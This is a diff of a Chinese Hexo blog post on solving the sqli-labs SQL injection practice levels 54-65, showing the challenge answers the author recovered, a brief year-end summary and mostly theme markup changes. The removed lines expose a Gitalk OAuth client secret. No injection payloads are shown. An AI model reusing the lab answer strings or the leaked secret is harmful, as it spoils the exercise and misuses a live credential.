+<h1 id="0x03-challenge"><a href="#0x03-challenge" class="headerlink" title="0x03 challenge"></a>0x03 challenge</h1><h2 id="less54-65-challenge"><a href="#less54-65-challenge" class="headerlink" title="less54-65(challenge)"></a>less54-65(challenge)</h2><p>实则就是增加了对查询次数限制<br>小BUG：页面后退就不会添加查询次数了<br>爆表名&gt;&gt;列名&gt;&gt;得出字段<br>yaon9gl5wo<br><img src="./17.png" alt=""></p>
+<p>secret_N3BG<br><img src="./18.png" alt=""></p>
+<p>RSIG77DiEpN3UnUgnRgVd5wC<br><img src="./19.png" alt=""><br>往后的就是对less54各种变形就不一一写了。</p>
 <h1 id="0x04年终总结"><a href="#0x04年终总结" class="headerlink" title="0x04年终总结"></a>0x04年终总结</h1><ul>
 <li>通过sqlilabs了解了基本的注入方法</li>
 <li>掌握了浏览器和tomact、数据库交互过程</li>
@@ -421,295 +218,137 @@
 <li>基本看了每个less源代码，学习php与数据库交互的形式和逻辑。<br>……………………………..</li>
 </ul>
 
-        </div>
-
-        <blockquote class="post-copyright">
-    
-    <div class="content">
-        
-<span class="post-time">
-    最后更新时间：<time datetime="2020-05-15T08:25:00.000Z" itemprop="dateUpdated">2020-05-15 16:25:00</time>
-</span><br>
-
-
-        
-        玩的开心
-        
-    </div>
-    
-    <footer>
-        <a href="http://zhzhdoai.github.io">
-            <img src="/img/avatar.jpg" alt="osword">
-            osword
-        </a>
-    </footer>
-</blockquote>
-
-        
-
-
-        <div class="post-footer">
-            
-	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li></ul>
-
-
-            
-<div class="page-share-wrap">
-    
-
-<div class="page-share" id="pageShare">
-    <ul class="reset share-icons">
-      <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/&title=《sqlilabs38-65》 — osword's blog&pic=http://zhzhdoai.github.io/img/avatar.jpg" data-title="微博">
-          <i class="icon icon-weibo"></i>
-        </a>
-      </li>
-      <li>
-        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
-          <i class="icon icon-weixin"></i>
-        </a>
-      </li>
-      <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/&title=《sqlilabs38-65》 — osword's blog&source=" data-title=" QQ">
-          <i class="icon icon-qq"></i>
-        </a>
-      </li>
-      <li>
-        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/" data-title=" Facebook">
-          <i class="icon icon-facebook"></i>
-        </a>
-      </li>
-      <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《sqlilabs38-65》 — osword's blog&url=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/&via=http://zhzhdoai.github.io" data-title=" Twitter">
-          <i class="icon icon-twitter"></i>
-        </a>
-      </li>
-      <li>
-        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/" data-title=" Google+">
-          <i class="icon icon-google-plus"></i>
-        </a>
-      </li>
-    </ul>
- </div>
-
-
-
-    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
-        <i class="icon icon-share-alt icon-lg"></i>
-    </a>
-</div>
-
-
-
-        </div>
-    </div>
-
-    
-<nav class="post-nav flex-row flex-justify-between">
-  
-    <div class="waves-block waves-effect prev">
-      <a href="/2018/12/27/DVWA%E7%B3%BB-Command-Injection/" id="post-prev" class="post-nav-link">
-        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
-        <h4 class="title">DVWA_(Command Injection)</h4>
-      </a>
-    </div>
-  
-
-  
-    <div class="waves-block waves-effect next">
-      <a href="/2018/12/22/sqlilabs23-28/" id="post-next" class="post-nav-link">
-        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
-        <h4 class="title">sqlilabs23-28</h4>
-      </a>
-    </div>
-  
-</nav>
-
-
-
-    
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<section class="comments" id="comments">
-    <div id="gitalk-container"></div>
-    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
-    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
-    <script src="/js/md5.min.js"></script>
-    <script>
-        var gitalk = new Gitalk({
-            clientID: '7d7576c71632f14d639a',
-            clientSecret: '3d7f7e4c0e9a43a2cc5334d68aee612090df8b70',
-            repo: 'zhzhdoai.github.io',
-            owner: 'zhzhdoai',
-            admin: 'zhzhdoai',
-            id: md5(location.pathname),
-            perPage: 50,
-            distractionFreeMode: 'false'
-        })
-
-        gitalk.render('gitalk-container')
-    </script>
-</section>
-
-
-
+  </div>
 </article>
 
 
 
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01堆栈查询"><span class="toc-number">1.</span> <span class="toc-text">0x01堆栈查询</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#堆栈查询解析"><span class="toc-number">1.1.</span> <span class="toc-text">堆栈查询解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less38-39"><span class="toc-number">1.2.</span> <span class="toc-text">less38-39</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less40-41"><span class="toc-number">1.3.</span> <span class="toc-text">less40-41</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less42-45"><span class="toc-number">1.4.</span> <span class="toc-text">less42-45</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-order-by-注入"><span class="toc-number">2.</span> <span class="toc-text">0x02 order by 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#参数注入"><span class="toc-number">2.1.</span> <span class="toc-text">参数注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#less46"><span class="toc-number">2.1.1.</span> <span class="toc-text">less46</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#报错注入"><span class="toc-number">2.1.2.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#延时注入"><span class="toc-number">2.1.3.</span> <span class="toc-text">延时注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#函数注入判断"><span class="toc-number">2.1.4.</span> <span class="toc-text">函数注入判断</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#procedure-analyse-注入"><span class="toc-number">2.2.</span> <span class="toc-text">procedure analyse 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#导入导出文件"><span class="toc-number">2.3.</span> <span class="toc-text">导入导出文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一句话木马"><span class="toc-number">2.3.1.</span> <span class="toc-text">一句话木马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less47-49-见解"><span class="toc-number">2.4.</span> <span class="toc-text">less47-49(见解)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less50-53"><span class="toc-number">2.5.</span> <span class="toc-text">less50-53</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-challenge"><span class="toc-number">3.</span> <span class="toc-text">0x03 challenge</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#less54-65-challenge"><span class="toc-number">3.1.</span> <span class="toc-text">less54-65(challenge)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04年终总结"><span class="toc-number">4.</span> <span class="toc-text">0x04年终总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/&text=sqlilabs38-65" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/&title=sqlilabs38-65" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/&is_video=false&description=sqlilabs38-65" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=sqlilabs38-65&body=Check out this article: http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/&title=sqlilabs38-65" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/&title=sqlilabs38-65" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/&title=sqlilabs38-65" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/&title=sqlilabs38-65" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/&name=sqlilabs38-65&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/&t=sqlilabs38-65" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
 </div>
 
-        <footer class="footer">
-    <div class="top">
         
-<p>
-    <span id="busuanzi_container_site_uv" style='display:none'>
-        站点总访客数：<span id="busuanzi_value_site_uv"></span>
-    </span>
-    <span id="busuanzi_container_site_pv" style='display:none'>
-        站点总访问量：<span id="busuanzi_value_site_pv"></span>
-    </span>
-</p>
-
-
-        <p>
-            
-                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
-            
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
-        </p>
-    </div>
-    <div class="bottom">
-        <p><span>osword &copy; 2015 - 2020</span>
-            <span>
-                
-                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
-            </span>
-        </p>
-    </div>
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2020
+    osword
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
 </footer>
 
-    </main>
-    <div class="mask" id="mask"></div>
-<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 
-
-<div class="global-share" id="globalShare">
-    <ul class="reset share-icons">
-      <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/&title=《sqlilabs38-65》 — osword's blog&pic=http://zhzhdoai.github.io/img/avatar.jpg" data-title="微博">
-          <i class="icon icon-weibo"></i>
-        </a>
-      </li>
-      <li>
-        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
-          <i class="icon icon-weixin"></i>
-        </a>
-      </li>
-      <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/&title=《sqlilabs38-65》 — osword's blog&source=" data-title=" QQ">
-          <i class="icon icon-qq"></i>
-        </a>
-      </li>
-      <li>
-        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/" data-title=" Facebook">
-          <i class="icon icon-facebook"></i>
-        </a>
-      </li>
-      <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《sqlilabs38-65》 — osword's blog&url=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/&via=http://zhzhdoai.github.io" data-title=" Twitter">
-          <i class="icon icon-twitter"></i>
-        </a>
-      </li>
-      <li>
-        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/" data-title=" Google+">
-          <i class="icon icon-google-plus"></i>
-        </a>
-      </li>
-    </ul>
- </div>
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
 
 
-<div class="page-modal wx-share" id="wxShare">
-    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/" alt="微信分享二维码">
-</div>
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
 
 
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
 
+<!-- clipboard -->
 
-    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
-<script>
-var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
 
-
-</script>
-
-<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
-
-
-<div class="search-panel" id="search-panel">
-    <ul class="search-result" id="search-result"></ul>
-</div>
-<template id="search-tpl">
-<li class="item">
-    <a href="{path}" class="waves-block waves-effect">
-        <div class="title ellipsis" title="{title}">{title}</div>
-        <div class="flex-row flex-middle">
-            <div class="tags ellipsis">
-                {tags}
-            </div>
-            <time class="flex-col time">{date}</time>
-        </div>
-    </a>
-</li>
-</template>
-
-<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
-
-
-
-
-
-
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-
-
-<script>
-(function() {
-    var OriginTitile = document.title, titleTime;
-    document.addEventListener('visibilitychange', function() {
-        if (document.hidden) {
-            document.title = '死鬼去哪里了！';
-            clearTimeout(titleTime);
-        } else {
-            document.title = '(つェ⊂)咦!又好了!';
-            titleTime = setTimeout(function() {
-                document.title = OriginTitile;
-            },2000);
-        }
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
     });
-})();
-</script>
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
 
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
 
 
 </body>
